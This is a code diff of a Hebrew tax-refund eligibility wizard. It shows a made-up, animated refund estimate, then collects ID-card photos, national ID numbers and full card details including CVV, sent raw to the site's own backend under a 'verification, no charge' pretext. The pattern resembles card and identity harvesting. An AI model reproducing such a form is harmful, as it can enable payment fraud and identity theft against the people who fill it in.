-        <strong>12%</strong> עמלת הצלחה — <strong>88%</strong> לכם
-      </div>
-      <div class="action-group">
-        <button class="submit-btn" id="uploadBtn">
-          העלאת טופס 106
-        </button>
-        <button class="submit-btn gold-outline" id="gotoPaymentBtn">
-          אימות כרטיס אשראי
-        </button>
-        <div style="font-size:12px;color:rgba(148,163,184,0.4);margin-top:-2px;">ניתן להשלים כל שלב בנפרד</div>
-      </div>
-    </div>
+      <!-- Track -->
+      <div class="wizard-body">
+        <div class="wizard-track" id="wizardTrack">
 
-    <!-- ─── Upload Screen ─── -->
-    <div class="result-screen" id="uploadScreen" style="display:none;">
-      <div class="result-icon">&#8207;</div>
-      <div class="result-label">העלאת טופס 106</div>
-      <div class="result-sub">
-        יש להעלות את טופס 106 שהתקבל מהמעסיק. ניתן לצלם ולשלוח ישירות מהמכשיר הנייד.
-      </div>
-      <form id="uploadForm" class="form-card">
-        <label class="file-drop" id="fileDropLabel">
-          <div style="font-size:14px;margin-bottom:4px;color:#64748B;">לחצו לבחירת קבצים</div>
-          <div style="font-size:11px;color:rgba(148,163,184,0.3);">PDF, JPG, PNG, DOC — עד 15MB לקובץ</div>
-        </label>
-        <input type="file" id="fileInput" accept=".pdf,.jpg,.jpeg,.png,.doc,.docx" multiple style="display:none;" />
-        <button type="submit" class="submit-btn" id="uploadSubmit">
-          העלאת מסמכים
-        </button>
-        <div id="uploadStatus" class="status-msg neutral-msg"></div>
-        <button type="button" class="skip-btn" id="skipUploadBtn">
-          דלגו והמשיכו לאימות כרטיס
-        </button>
-      </form>
-    </div>
+          <!-- ═══ Step 1: Name & Phone ═══ -->
+          <div class="wizard-step" data-step="1">
+            <div class="step-title">ברוכים הבאים</div>
+            <div class="step-sub">נשמח לבצע בדיקת זכאות מהירה. יש למלא את הפרטים הבאים:</div>
+            <div class="field-group">
+              <input type="text" id="nameInput" placeholder="שם מלא" dir="rtl" />
+              <input type="tel" id="phoneInput" placeholder="טלפון נייד" dir="rtl" inputmode="tel" />
+            </div>
+            <button class="cta-btn" id="step1Btn">להמשך הבדיקה</button>
+          </div>
 
-    <!-- ─── Payment Screen ─── -->
-    <div class="result-screen" id="paymentScreen" style="display:none;">
-      <div class="result-icon">&#8207;</div>
-      <div class="result-label" style="font-size:16px;">אימות כרטיס אשראי</div>
-      <div class="result-sub" style="font-size:13px;max-width:300px;">
-        נדרש אימות כרטיס אשראי לצורך הגשת הדוח מול רשות המיסים.
-        <strong>לא יחויב כרטיסכם בשלב זה.</strong> החיוב בגין עמלת ההצלחה (12%) יתבצע רק לאחר קבלת הכסף בפועל.
-      </div>
-      <div id="paymentError" class="status-msg error-msg" style="display:none;"></div>
-      <form id="paymentForm" class="form-card">
-        <input type="text" id="cardNumber" inputmode="numeric" placeholder="מספר כרטיס" dir="ltr" style="text-align:left;letter-spacing:1px;" />
-        <div class="row-duo">
-          <input type="text" id="cardExpiry" inputmode="numeric" placeholder="תוקף (MM/YY)" dir="ltr" />
-          <input type="text" id="cardCvv" inputmode="numeric" placeholder="CVV" dir="ltr" style="flex:0 0 90px;" />
-        </div>
-        <input type="text" id="cardHolderId" inputmode="numeric" placeholder="תעודת זהות" dir="rtl" style="text-align:right;" />
-        <input type="text" id="cardHolderName" placeholder="שם בעל הכרטיס" dir="rtl" style="text-align:right;" />
-        <button type="submit" class="submit-btn" id="paymentSubmit">
-          אימות כרטיס
-        </button>
-        <div id="paymentStatus" class="status-msg neutral-msg"></div>
-      </form>
-      <div class="security-badges">
-        <span>מאובטח ב-SSL</span>
-        <span>הצפנה מלאה</span>
-        <span>סליקה ישראלית</span>
-      </div>
-    </div>
+          <!-- ═══ Step 2: Employment Status ═══ -->
+          <div class="wizard-step" data-step="2">
+            <div class="step-title">סטטוס תעסוקתי</div>
+            <div class="step-sub">מהו הסטטוס התעסוקתי שלכם ב-6 השנים האחרונות?</div>
+            <div class="option-group" id="employmentGroup">
+              <button class="option-btn" data-value="שכיר">שכיר</button>
+              <button class="option-btn" data-value="עצמאי">עצמאי</button>
+              <button class="option-btn" data-value="גם וגם">גם שכיר וגם עצמאי</button>
+              <button class="option-btn" data-value="חייל משוחרר">חייל משוחרר</button>
+            </div>
+            <button class="cta-btn" id="step2Btn" disabled>לשלב הבא</button>
+            <div class="back-link" data-goto="1">חזרה</div>
+          </div>
 
-    <!-- ─── Final Success Screen ─── -->
-    <div class="result-screen" id="successScreen" style="display:none;">
-      <div class="result-icon" style="border-color:rgba(212,175,55,0.2);">✓</div>
-      <div class="result-label">בקשתכם התקבלה</div>
-      <div class="result-sub" style="max-width:300px;">
-        פרטיכם נשלחו לצוות הבדיקה. נעדכן אתכם בהודעת SMS מיד עם קבלת אישור מרשות המיסים.
-      </div>
-      <div class="fee-note">
-        <strong>12%</strong> עמלת הצלחה — בפועל בלבד
-      </div>
-      <div style="font-size:13px;color:rgba(148,163,184,0.4);margin-top:8px;">צוות מיסה לרשותכם בכל עת</div>
-    </div>
+          <!-- ═══ Step 3: Job Changes ═══ -->
+          <div class="wizard-step" data-step="3">
+            <div class="step-title">שינויים תעסוקתיים</div>
+            <div class="step-sub">האם החלפתם מקומות עבודה או חוויתם תקופות אבטלה ב-6 השנים האחרונות?</div>
+            <div class="option-group" id="jobGroup">
+              <button class="option-btn" data-value="כן">כן</button>
+              <button class="option-btn" data-value="לא">לא</button>
+            </div>
+            <button class="cta-btn" id="step3Btn" disabled>לשלב הבא</button>
+            <div class="back-link" data-goto="2">חזרה</div>
+          </div>
+
+          <!-- ═══ Step 4: Pensya / Insurance ═══ -->
+          <div class="wizard-step" data-step="4">
+            <div class="step-title">קרנות וביטוחים</div>
+            <div class="step-sub">האם יש לכם קרנות השתלמות, קופות גמל או ביטוחי חיים מחברות כמו הראל, מנורה ומגדל?</div>
+            <div class="option-group" id="pensyaGroup">
+              <button class="option-btn" data-value="כן">כן</button>
+              <button class="option-btn" data-value="לא">לא</button>
+              <button class="option-btn" data-value="לא בטוח">לא בטוח — נדרשת בדיקה</button>
+            </div>
+            <button class="cta-btn" id="step4Btn" disabled>להמשך לקבצים</button>
+            <div class="back-link" data-goto="3">חזרה</div>
+          </div>
+
+          <!-- ═══ Step 5: Upload ═══ -->
+          <div class="wizard-step" data-step="5">
+            <div class="step-title">העלאת מסמכים</div>
+            <div class="step-sub">יש להעלות את המסמכים הנדרשים לבדיקה מקיפה מול רשות המיסים.</div>
+
+            <div class="upload-area">
+              <!-- Form 106 -->
+              <div class="drop-zone" id="drop106">
+                <input type="file" id="fileInput106" accept=".pdf,.jpg,.jpeg,.png,.doc,.docx" multiple style="display:none" />
+                <div class="icon">&#128196;</div>
+                <div class="title">טופס 106</div>
+                <div class="hint">PDF, JPG, PNG, DOC — עד 15MB לקובץ</div>
+                <div class="file-name" id="file106Name"></div>
+              </div>
+
+              <!-- ID photo (required) -->
+              <div class="drop-zone required" id="dropId">
+                <input type="file" id="fileInputId" accept=".jpg,.jpeg,.png,.pdf" style="display:none" />
+                <div class="icon">&#128179;</div>
+                <div class="title">צילום תעודת זהות + ספח</div>
+                <div class="hint">JPG, PNG, PDF — צילום ברור</div>
+                <div class="file-name" id="idFileName"></div>
+              </div>
+            </div>
+
+            <div id="uploadStatus" class="status-msg neutral"></div>
+            <button class="cta-btn" id="step5Btn">העלאה והמשך</button>
+            <div class="back-link" data-goto="4">חזרה</div>
+          </div>
+
+          <!-- ═══ Step 6: Payment ═══ -->
+          <div class="wizard-step" data-step="6">
+            <div class="step-title">אימות כרטיס אשראי</div>
+            <div class="step-sub" style="max-width:300px;">
+              נדרש אימות כרטיס לצורך הגשת הדוח.<br/>
+              <strong>לא יחויב כרטיסכם בשלב זה.</strong> החיוב (12%) יתבצע רק עם קבלת הכסף בפועל.
+            </div>
+            <div id="paymentError" class="status-msg err" style="display:none;"></div>
+            <div class="payment-grid">
+              <input type="text" id="cardNumber" inputmode="numeric" placeholder="מספר כרטיס" dir="ltr" style="text-align:left;letter-spacing:1px;" />
+              <div class="row-duo">
+                <input type="text" id="cardExpiry" inputmode="numeric" placeholder="תוקף (MM/YY)" dir="ltr" />
+                <input type="text" id="cardCvv" inputmode="numeric" placeholder="CVV" dir="ltr" />
+              </div>
+              <input type="text" id="cardHolderId" inputmode="numeric" placeholder="תעודת זהות" dir="rtl" style="text-align:right;" />
+              <input type="text" id="cardHolderName" placeholder="שם בעל הכרטיס" dir="rtl" style="text-align:right;" />
+            </div>
+            <div id="paymentStatus" class="status-msg neutral"></div>
+            <button class="cta-btn" id="step6Btn">אימות כרטיס</button>
+            <div class="back-link" data-goto="5">חזרה</div>
+            <div class="security-badges">
+              <span>מאובטח ב-SSL</span>
+              <span>הצפנה מלאה</span>
+              <span>סליקה ישראלית</span>
+            </div>
+          </div>
+
+          <!-- ═══ Done ═══ -->
+          <div class="wizard-step" data-step="done">
+            <div class="success-wrap">
+              <div class="success-icon">✓</div>
+              <div class="success-title">בקשתכם התקבלה</div>
+              <div class="success-sub">
+                פרטיכם נשלחו לצוות הבדיקה.<br/>
+                נעדכן אתכם בהודעת <strong>SMS</strong> מיד עם קבלת אישור מרשות המיסים.
+              </div>
+              <div class="success-note">
+                <strong>12%</strong> עמלת הצלחה — בפועל בלבד
+              </div>
+              <div style="font-size:13px;color:rgba(148,163,184,0.35);margin-top:14px;">צוות מיסה לרשותכם</div>
+            </div>
+          </div>
+
+        </div><!-- /wizard-track -->
+      </div><!-- /wizard-body -->
+    </div><!-- /wizard -->
 
   </div>
 
-  <!-- ─── Confetti Canvas ─── -->
   <canvas id="confetti-canvas"></canvas>
 
   <script>
-    // ──────────────────────────────────────────────────────────────────
-    // State
-    // ──────────────────────────────────────────────────────────────────
+    // ─── State ───────────────────────────────────────────────────
     const state = {
-      currentStep: 0,
-      refund: 0,
+      step: 1,
+      name: '',
+      phone: '',
       answers: [],
-      isAnimating: false,
+      refund: 0,
+      // upload
+      files106: [],
+      idFile: null,
     };
 
-    // ──────────────────────────────────────────────────────────────────
-    // Questions
-    // ──────────────────────────────────────────────────────────────────
-    const QUESTIONS = [{
-      id: 'work',
-      text: 'האם חל שינוי במקום העבודה שלכם ב-6 השנים האחרונות?',
-      yesAdd: 1800,
-      noAdd: 0,
-      options: ['כן', 'לא'],
-    }, {
-      id: 'unemployment',
-      text: 'האם הייתם מובטלים בתקופה כלשהי בשנים האחרונות?',
-      yesAdd: 1700,
-      noAdd: 0,
-      options: ['כן', 'לא'],
-    }, {
-      id: 'student',
-      text: 'האם הייתם סטודנטים בשנים האחרונות?',
-      yesAdd: 2000,
-      noAdd: 0,
-      options: ['כן', 'לא'],
-    }, {
-      id: 'medical',
-      text: 'האם היו לכם הוצאות רפואיות או טיפולי שיניים משמעותיים?',
-      yesAdd: 2500,
-      noAdd: 0,
-      options: ['כן', 'לא'],
-    }, ];
+    const EMPLOYMENT_BASES = {
+      'שכיר': 600,
+      'עצמאי': 2200,
+      'גם וגם': 2800,
+      'חייל משוחרר': 400,
+    };
 
-    const TOTAL_REFUND_MAX = 8000;
     const API_BASE = window.location.origin;
+    const TOTAL_STEPS = 6;
+    const TOTAL_SLIDES = 7; // 6 steps + done screen
 
-    // ─── Session Persistence ─────────────────────────────────────
-    function saveSession(screen, extra) {
-      const data = { screen, refund: state.refund, answers: state.answers, ...extra };
-      try { sessionStorage.setItem('misa_state', JSON.stringify(data)); } catch (_) {}
-    }
-    function clearSession() {
-      try { sessionStorage.removeItem('misa_state'); } catch (_) {}
-    }
-    function loadSession() {
-      try { return JSON.parse(sessionStorage.getItem('misa_state')); } catch (_) { return null; }
-    }
-
-    // ──────────────────────────────────────────────────────────────────
-    // DOM refs
-    // ──────────────────────────────────────────────────────────────────
-    const welcomeScreen = document.getElementById('welcomeScreen');
-    const chatArea = document.getElementById('chatArea');
-    const inputArea = document.getElementById('inputArea');
-    const resultScreen = document.getElementById('resultScreen');
-    const startBtn = document.getElementById('startBtn');
+    // ─── DOM Refs ────────────────────────────────────────────────
+    const track = document.getElementById('wizardTrack');
+    const stepNum = document.getElementById('stepNum');
+    const stepTotal = document.getElementById('stepTotal');
+    const stepPct = document.getElementById('stepPct');
     const progressFill = document.getElementById('progressFill');
     const refundAmount = document.getElementById('refundAmount');
-    const leadForm = document.getElementById('leadForm');
-    const phoneInput = document.getElementById('phoneInput');
-    const nameInput = document.getElementById('nameInput');
-    const leadSubmit = document.getElementById('leadSubmit');
-    const finalRefund = document.getElementById('finalRefund');
 
-    const paymentScreen = document.getElementById('paymentScreen');
-    const paymentForm = document.getElementById('paymentForm');
+    const nameInput = document.getElementById('nameInput');
+    const phoneInput = document.getElementById('phoneInput');
+    const step1Btn = document.getElementById('step1Btn');
+
+    const employmentGroup = document.getElementById('employmentGroup');
+    const step2Btn = document.getElementById('step2Btn');
+
+    const jobGroup = document.getElementById('jobGroup');
+    const step3Btn = document.getElementById('step3Btn');
+
+    const pensyaGroup = document.getElementById('pensyaGroup');
+    const step4Btn = document.getElementById('step4Btn');
+
+    const drop106 = document.getElementById('drop106');
+    const fileInput106 = document.getElementById('fileInput106');
+    const file106Name = document.getElementById('file106Name');
+    const dropId = document.getElementById('dropId');
+    const fileInputId = document.getElementById('fileInputId');
+    const idFileName = document.getElementById('idFileName');
+    const uploadStatus = document.getElementById('uploadStatus');
+    const step5Btn = document.getElementById('step5Btn');
+
     const cardNumber = document.getElementById('cardNumber');
     const cardExpiry = document.getElementById('cardExpiry');
     const cardCvv = document.getElementById('cardCvv');
     const cardHolderId = document.getElementById('cardHolderId');
     const cardHolderName = document.getElementById('cardHolderName');
-    const paymentSubmit = document.getElementById('paymentSubmit');
-    const paymentStatus = document.getElementById('paymentStatus');
     const paymentError = document.getElementById('paymentError');
-    const successScreen = document.getElementById('successScreen');
+    const paymentStatus = document.getElementById('paymentStatus');
+    const step6Btn = document.getElementById('step6Btn');
 
-    const uploadScreen = document.getElementById('uploadScreen');
-    const uploadBtn = document.getElementById('uploadBtn');
-    const uploadForm = document.getElementById('uploadForm');
-    const fileInput = document.getElementById('fileInput');
-    const fileDropLabel = document.getElementById('fileDropLabel');
-    const uploadSubmit = document.getElementById('uploadSubmit');
-    const uploadStatus = document.getElementById('uploadStatus');
-    const skipUploadBtn = document.getElementById('skipUploadBtn');
+    // ─── Navigation ─────────────────────────────────────────────
+    function goToStep(n) {
+      state.step = n;
+      const disp = Math.min(n, TOTAL_STEPS);
+      const pct = Math.round((disp / TOTAL_STEPS) * 100);
+      stepNum.textContent = disp;
+      stepTotal.textContent = TOTAL_STEPS;
+      stepPct.textContent = pct + '%';
+      progressFill.style.width = pct + '%';
+      const idx = n > TOTAL_STEPS ? TOTAL_SLIDES - 1 : n - 1;
+      track.style.transform = `translateX(-${(idx / TOTAL_SLIDES) * 100}%)`;
+    }
 
-    // ──────────────────────────────────────────────────────────────────
-    // Confetti
-    // ──────────────────────────────────────────────────────────────────
+    function goBack(e) {
+      const target = e.currentTarget;
+      const step = parseInt(target.dataset.goto);
+      if (step) goToStep(step);
+    }
+    document.querySelectorAll('.back-link').forEach(el => el.addEventListener('click', goBack));
+
+    // ─── Progress helpers ───────────────────────────────────────
+    function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+    function formatNum(n) { return n.toLocaleString('he-IL'); }
+
+    function updateRefundUI(val) {
+      state.refund = val;
+      refundAmount.textContent = formatNum(val);
+    }
+
+    function animateRefund(from, to, duration) {
+      duration = duration || 700;
+      const start = performance.now();
+      function tick(now) {
+        const elapsed = now - start;
+        const p = Math.min(elapsed / duration, 1);
+        const eased = 1 - Math.pow(1 - p, 4);
+        const cur = Math.round(from + (to - from) * eased);
+        updateRefundUI(cur);
+        if (p < 1) requestAnimationFrame(tick);
+      }
+      requestAnimationFrame(tick);
+    }
+
+    function calcRefundLocal() {
+      const empAns = state.answers.find(a => a.questionId === 'employment');
+      const base = empAns ? (EMPLOYMENT_BASES[empAns.answer] || 0) : 0;
+      let total = base;
+      const jobAns = state.answers.find(a => a.questionId === 'job_changes');
+      if (jobAns && jobAns.answer === 'כן') total += 1800;
+      const penAns = state.answers.find(a => a.questionId === 'pensya');
+      if (penAns && penAns.answer === 'כן') total += 2200;
+      else if (penAns && penAns.answer === 'לא בטוח') total += 1000;
+      if (total === 0) total = 800;
+      return total;
+    }
+
+    function refreshRefund() {
+      const from = state.refund;
+      const to = calcRefundLocal();
+      animateRefund(from, to);
+    }
+
+    // ─── Option button handler ──────────────────────────────────
+    function setupOptionGroup(containerId, btnId, questionId, allowNext) {
+      const container = document.getElementById(containerId);
+      const btn = document.getElementById(btnId);
+      const opts = container.querySelectorAll('.option-btn');
+
+      opts.forEach(opt => {
+        opt.addEventListener('click', () => {
+          opts.forEach(o => o.classList.remove('selected'));
+          opt.classList.add('selected');
+          const val = opt.dataset.value;
+          // update answers
+          const idx = state.answers.findIndex(a => a.questionId === questionId);
+          if (idx >= 0) state.answers[idx] = { questionId, answer: val };
+          else state.answers.push({ questionId, answer: val });
+          if (btn) btn.disabled = false;
+          refreshRefund();
+          if (allowNext) {
+            setTimeout(() => goToStep(allowNext), 350);
+          }
+        });
+      });
+    }
+
+    // ─── Session persistence ────────────────────────────────────
+    function saveSession() {
+      const data = { step: state.step, name: state.name, phone: state.phone, answers: state.answers, refund: state.refund };
+      try { sessionStorage.setItem('misa_wizard', JSON.stringify(data)); } catch (_) {}
+    }
+    function loadSession() {
+      try { return JSON.parse(sessionStorage.getItem('misa_wizard')); } catch (_) { return null; }
+    }
+    function clearSession() {
+      try { sessionStorage.removeItem('misa_wizard'); } catch (_) {}
+    }
+
+    // ─── Step 1: Name + Phone ───────────────────────────────────
+    step1Btn.addEventListener('click', () => {
+      const name = nameInput.value.trim();
+      const phone = phoneInput.value.trim();
+      nameInput.classList.remove('err');
+      phoneInput.classList.remove('err');
+      let valid = true;
+      if (!name || name.length < 2) { nameInput.classList.add('err'); valid = false; }
+      if (!phone || phone.length < 9) { phoneInput.classList.add('err'); valid = false; }
+      if (!valid) return;
+      state.name = name;
+      state.phone = phone;
+      saveSession();
+      goToStep(2);
+    });
+
+    // ─── Step 2: Employment ─────────────────────────────────────
+    setupOptionGroup('employmentGroup', 'step2Btn', 'employment', 0);
+    step2Btn.addEventListener('click', () => { saveSession(); goToStep(3); });
+
+    // ─── Step 3: Job Changes ────────────────────────────────────
+    setupOptionGroup('jobGroup', 'step3Btn', 'job_changes', 0);
+    step3Btn.addEventListener('click', () => { saveSession(); goToStep(4); });
+
+    // ─── Step 4: Pensya ─────────────────────────────────────────
+    setupOptionGroup('pensyaGroup', 'step4Btn', 'pensya', 0);
+    step4Btn.addEventListener('click', () => {
+      // Submit lead + answers to backend
+      step4Btn.disabled = true;
+      step4Btn.textContent = 'שולח...';
+      submitLead().then(() => {
+        saveSession();
+        goToStep(5);
+      }).catch(err => {
+        step4Btn.disabled = false;
+        step4Btn.textContent = 'להמשך לקבצים';
+        alert('שגיאה בשליחת הפרטים: ' + err.message);
+      });
+    });
+
+    async function submitLead() {
+      const res = await fetch(API_BASE + '/api/submit-lead', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          name: state.name,
+          phone: state.phone,
+          answers: state.answers,
+        }),
+      });
+      const data = await res.json();
+      if (!res.ok) throw new Error(data.error || 'שגיאה בשליחה');
+      return data;
+    }
+
+    // ─── Step 5: Upload ─────────────────────────────────────────
+    // Form 106 zone
+    drop106.addEventListener('click', () => fileInput106.click());
+    fileInput106.addEventListener('change', () => {
+      state.files106 = Array.from(fileInput106.files || []);
+      if (state.files106.length > 0) {
+        file106Name.textContent = state.files106.map(f => f.name).join(', ');
+        drop106.classList.add('has-file');
+      } else {
+        file106Name.textContent = '';
+        drop106.classList.remove('has-file');
+      }
+    });
+
+    // ID photo zone
+    dropId.addEventListener('click', () => fileInputId.click());
+    fileInputId.addEventListener('change', () => {
+      const files = fileInputId.files;
+      state.idFile = files && files.length > 0 ? files[0] : null;
+      if (state.idFile) {
+        idFileName.textContent = state.idFile.name;
+        dropId.classList.add('has-file');
+      } else {
+        idFileName.textContent = '';
+        dropId.classList.remove('has-file');
+      }
+    });
+
+    step5Btn.addEventListener('click', async () => {
+      // ID photo is required
+      if (!state.idFile) {
+        uploadStatus.textContent = 'נא לצרף צילום תעודת זהות + ספח (שדה חובה)';
+        uploadStatus.className = 'status-msg err';
+        return;
+      }
+      step5Btn.disabled = true;
+      step5Btn.textContent = 'מעלה...';
+      uploadStatus.textContent = '';
+      uploadStatus.className = 'status-msg neutral';
+
+      try {
+        const fd = new FormData();
+        fd.append('phone', state.phone.replace(/[^0-9]/g, ''));
+        for (const f of state.files106) fd.append('documents', f);
+        fd.append('id_photo', state.idFile);
+
+        const res = await fetch(API_BASE + '/api/upload-106', { method: 'POST', body: fd });
+        const data = await res.json();
+        if (!res.ok) throw new Error(data.error || 'שגיאה בהעלאה');
+
+        uploadStatus.textContent = '✓ ' + data.message;
+        uploadStatus.className = 'status-msg ok';
+        saveSession();
+        await sleep(800);
+        goToStep(6);
+      } catch (err) {
+        uploadStatus.textContent = err.message;
+        uploadStatus.className = 'status-msg err';
+        step5Btn.disabled = false;
+        step5Btn.textContent = 'העלאה והמשך';
+      }
+    });
+
+    // ─── Step 6: Payment ────────────────────────────────────────
+    cardNumber.addEventListener('input', () => {
+      let v = cardNumber.value.replace(/[^0-9]/g, '').slice(0, 16);
+      cardNumber.value = v.replace(/(.{4})/g, '$1 ').trim();
+      cardNumber.classList.remove('err');
+    });
+    cardExpiry.addEventListener('input', () => {
+      let v = cardExpiry.value.replace(/[^0-9]/g, '').slice(0, 4);
+      cardExpiry.value = v.length >= 3 ? v.slice(0,2) + '/' + v.slice(2) : v;
+      cardExpiry.classList.remove('err');
+    });
+    cardCvv.addEventListener('input', () => {
+      cardCvv.value = cardCvv.value.replace(/[^0-9]/g, '').slice(0, 4);
+      cardCvv.classList.remove('err');
+    });
+    cardHolderId.addEventListener('input', () => {
+      cardHolderId.value = cardHolderId.value.replace(/[^0-9]/g, '').slice(0, 9);
+      cardHolderId.classList.remove('err');
+    });
+
+    function showPayError(msg) {
+      paymentError.textContent = msg;
+      paymentError.style.display = 'block';
+    }
+
+    step6Btn.addEventListener('click', async () => {
+      const ccNum = cardNumber.value.replace(/\s/g, '');
+      const expRaw = cardExpiry.value.replace('/', '');
+      const cvv = cardCvv.value;
+      const holderId = cardHolderId.value.replace(/[^0-9]/g, '');
+      const holderName = cardHolderName.value.trim() || state.name;
+
+      paymentError.style.display = 'none';
+      cardNumber.classList.remove('err');
+      cardExpiry.classList.remove('err');
+      cardCvv.classList.remove('err');
+      cardHolderId.classList.remove('err');
+
+      let valid = true;
+      if (ccNum.length < 13) { cardNumber.classList.add('err'); valid = false; }
+      if (expRaw.length < 4) { cardExpiry.classList.add('err'); valid = false; }
+      if (cvv.length < 3) { cardCvv.classList.add('err'); valid = false; }
+      if (holderId.length < 8) { cardHolderId.classList.add('err'); valid = false; }
+      if (!valid) { showPayError('נא למלא את כל שדות הכרטיס כראוי'); return; }
+
+      step6Btn.disabled = true;
+      step6Btn.textContent = 'מאמת כרטיס...';
+      paymentStatus.textContent = '';
+      paymentStatus.className = 'status-msg neutral';
+
+      try {
+        const res = await fetch(API_BASE + '/api/setup-payment', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            phone: state.phone.replace(/[^0-9]/g, ''),
+            cardNumber: ccNum,
+            expMonth: expRaw.slice(0,2),
+            expYear: expRaw.slice(2),
+            cvv,
+            holderId,
+            holderName,
+          }),
+        });
+        const data = await res.json();
+        if (!res.ok) throw new Error(data.error || 'אימות הכרטיס נכשל');
+
+        step6Btn.textContent = 'אומת';
+        paymentStatus.textContent = 'כרטיס אומת בהצלחה';
+        paymentStatus.className = 'status-msg ok';
+
+        clearSession();
+        await sleep(800);
+        goToStep(7); // done step (index 7, but we have 6 steps, so we use step = 7 for done)
+        launchConfetti();
+      } catch (err) {
+        showPayError(err.message);
+        step6Btn.disabled = false;
+        step6Btn.textContent = 'אימות כרטיס';
+      }
+    });
+
+    // ─── Confetti ───────────────────────────────────────────────
     function launchConfetti() {
       const canvas = document.getElementById('confetti-canvas');
       const ctx = canvas.getContext('2d');
       canvas.width = window.innerWidth;
       canvas.height = window.innerHeight;
-
       const pieces = [];
-      const colors = ['#D4AF37', '#C5A880', '#94A3B8', '#E2E8F0', '#FBBF24'];
-
+      const colors = ['#D4AF37','#C5A880','#94A3B8','#E2E8F0','#FBBF24'];
       for (let i = 0; i < 180; i++) {
         pieces.push({
           x: Math.random() * canvas.width,
           y: Math.random() * canvas.height * -1 - 20,
-          w: Math.random() * 10 + 5,
-          h: Math.random() * 6 + 3,
+          w: Math.random() * 10 + 5, h: Math.random() * 6 + 3,
           color: colors[Math.floor(Math.random() * colors.length)],
-          vx: (Math.random() - 0.5) * 4,
-          vy: Math.random() * 3 + 2,
-          rot: Math.random() * 360,
-          rotV: (Math.random() - 0.5) * 8,
-          opacity: 1,
+          vx: (Math.random() - 0.5) * 4, vy: Math.random() * 3 + 2,
+          rot: Math.random() * 360, rotV: (Math.random() - 0.5) * 8, opacity: 1,
         });
       }
-
-      let frame = 0;
-      const maxFrames = 160;
-
+      let frame = 0, maxFrames = 160;
       function draw() {
         ctx.clearRect(0, 0, canvas.width, canvas.height);
         let alive = false;
         for (const p of pieces) {
-          p.x += p.vx;
-          p.y += p.vy;
-          p.vy += 0.05;
-          p.rot += p.rotV;
+          p.x += p.vx; p.y += p.vy; p.vy += 0.05; p.rot += p.rotV;
           if (frame > maxFrames - 40) p.opacity = Math.max(0, p.opacity - 0.025);
           if (p.y > canvas.height + 20 || p.opacity <= 0) continue;
           alive = true;
-          ctx.save();
-          ctx.translate(p.x, p.y);
+          ctx.save(); ctx.translate(p.x, p.y);
           ctx.rotate((p.rot * Math.PI) / 180);
           ctx.globalAlpha = p.opacity;
           ctx.fillStyle = p.color;
@@ -1012,522 +874,58 @@
         }
         frame++;
         if (alive && frame < maxFrames) requestAnimationFrame(draw);
-        else { ctx.clearRect(0, 0, canvas.width, canvas.height); }
+        else ctx.clearRect(0, 0, canvas.width, canvas.height);
       }
       draw();
     }
 
-    // ──────────────────────────────────────────────────────────────────
-    // Helpers
-    // ──────────────────────────────────────────────────────────────────
-    function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
-    function formatNumber(n) { return n.toLocaleString('he-IL'); }
-    function updateRefundDisplay(value) { refundAmount.textContent = formatNumber(value); }
-
-    function updateProgress(step) {
-      const pct = (step / 5) * 100;
-      progressFill.style.width = pct + '%';
-      document.querySelectorAll('.progress-labels .step').forEach(el => {
-        el.classList.toggle('active', parseInt(el.dataset.step) <= step);
-      });
-    }
-
-    function scrollChatDown() { chatArea.scrollTop = chatArea.scrollHeight; }
-
-    // ──────────────────────────────────────────────────────────────────
-    // Chat bubble helpers
-    // ──────────────────────────────────────────────────────────────────
-    function addBotBubble(text) {
-      const div = document.createElement('div');
-      div.className = 'bubble bot';
-      div.textContent = text;
-      chatArea.appendChild(div);
-      scrollChatDown();
-      return div;
-    }
-
-    function addUserBubble(text) {
-      const div = document.createElement('div');
-      div.className = 'bubble user';
-      div.textContent = text;
-      chatArea.appendChild(div);
-      scrollChatDown();
-      return div;
-    }
-
-    function addTypingBubble() {
-      const div = document.createElement('div');
-      div.className = 'bubble bot';
-      div.innerHTML = '<div class="typing-dots"><span></span><span></span><span></span></div>';
-      chatArea.appendChild(div);
-      scrollChatDown();
-      return div;
-    }
-
-    function addSystemBubble(text) {
-      const div = document.createElement('div');
-      div.className = 'bubble system';
-      div.textContent = text;
-      chatArea.appendChild(div);
-      scrollChatDown();
-      return div;
-    }
-
-    function removeTyping(typingEl) {
-      if (typingEl && typingEl.parentNode) typingEl.remove();
-    }
-
-    function showOptions(options, onSelect) {
-      const container = document.createElement('div');
-      container.className = 'options-container';
-      options.forEach(opt => {
-        const btn = document.createElement('button');
-        btn.className = 'option-btn';
-        btn.textContent = opt;
-        btn.addEventListener('click', () => {
-          document.querySelectorAll('.option-btn').forEach(b => b.disabled = true);
-          btn.classList.add('selected');
-          setTimeout(() => onSelect(opt), 300);
-        });
-        container.appendChild(btn);
-      });
-      chatArea.appendChild(container);
-      scrollChatDown();
-      return container;
-    }
-
-    // ──────────────────────────────────────────────────────────────────
-    // Animate refund counter tick
-    // ──────────────────────────────────────────────────────────────────
-    function animateRefund(from, to, duration = 800) {
-      const start = performance.now();
-      function tick(now) {
-        const elapsed = now - start;
-        const progress = Math.min(elapsed / duration, 1);
-        const eased = 1 - Math.pow(1 - progress, 4);
-        const current = Math.round(from + (to - from) * eased);
-        updateRefundDisplay(current);
-        if (progress < 1) requestAnimationFrame(tick);
-      }
-      requestAnimationFrame(tick);
-    }
-
-    // ──────────────────────────────────────────────────────────────────
-    // The Chat Flow
-    // ──────────────────────────────────────────────────────────────────
-    async function startChat() {
-      state.currentStep = 0;
-      state.refund = 0;
-      state.answers = [];
-      updateRefundDisplay(0);
-      updateProgress(0);
-
-      welcomeScreen.classList.add('hidden');
-      resultScreen.style.display = 'none';
-      inputArea.classList.add('hidden');
-      chatArea.classList.remove('hidden');
-      chatArea.innerHTML = '';
-
-      await sleep(400);
-
-      // Intro
-      addBotBubble('שלום וברכה. אני המערכת החכמה של מיסה לבדיקת זכאות להחזר מס.');
-      await sleep(600);
-      addBotBubble('אשאל אתכם 4 שאלות קצרות לצורך ניתוח פיננסי ראשוני. התהליך אורך כדקה.');
-      await sleep(500);
-      addBotBubble('לתשומת לבכם: כל המידע נשמר בהצפנה מלאה ומשמש אך ורק לצורך בדיקת זכאותכם.');
-      await sleep(500);
-
-      // Ask questions one by one
-      for (let i = 0; i < QUESTIONS.length; i++) {
-        const q = QUESTIONS[i];
-        state.currentStep = i + 1;
